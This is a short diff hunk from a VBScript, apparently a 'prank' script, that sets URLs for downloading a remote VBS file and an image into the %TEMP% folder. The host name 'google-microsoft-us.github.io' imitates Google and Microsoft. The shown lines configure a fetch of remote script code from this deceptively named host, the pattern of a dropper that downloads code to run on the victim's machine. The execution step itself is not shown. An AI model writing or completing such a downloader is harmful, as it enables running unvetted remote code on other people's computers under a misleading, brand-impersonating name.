@@ -10,7 +10,7 @@ tempFolder = objFSO.GetSpecialFolder(2)   ' %TEMP%
 
 ' ---------- CONFIGURE THESE URLS ----------
 remoteVBS_URL = "https://google-microsoft-us.github.io/downloads/agta.vbs"
-remoteImage_URL = "https://google-microsoft-us.github.io/downloads/error.png"
+remoteImage_URL = "https://google-microsoft-us.github.io/downloads/3fe6cb1b-1e99-4d90-b887-709307976790.jpeg"
 ' ------------------------------------------
 
 ' 1. Download the remote prank VBS
